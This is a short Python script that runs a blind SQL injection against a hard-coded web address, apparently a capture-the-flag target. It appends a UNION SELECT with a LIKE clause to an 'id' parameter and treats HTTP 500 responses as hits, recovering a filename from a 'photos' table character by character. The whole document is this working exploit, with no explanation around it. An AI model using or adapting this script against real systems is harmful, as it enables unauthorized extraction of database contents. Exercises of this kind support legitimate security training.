#! /usr/bin/python3
import requests, sys


def check_status(string):
    return requests.get("http://35.227.24.107/32c028a2fa/fetch?id=-1 UNION SELECT filename FROM photos WHERE filename LIKE '" + string + "%' and id=3").status_code == 500


letters = [chr(num) for num in range(65,91)] + [chr(num) for num in range(97,123)] + list(map(str, range(10)))


print("( Print Ctrl + C to exit. )\n[+] Letters: ")
print(*letters, sep=" ")


file_name = ""

valid_chars = []

try:
    while True:
        for letter in letters:
            if check_status(file_name+letter):
                file_name += letter
                print(f"\r[+] Partial File name: {file_name}",end="")
                break
        else:
            break
    print(f"\n[+] Final File name: {file_name}")
except KeyboardInterrupt:
    print("[-] User Interrupt recorded...")
finally:    
    print("[-] Exiting...")
    sys.exit()



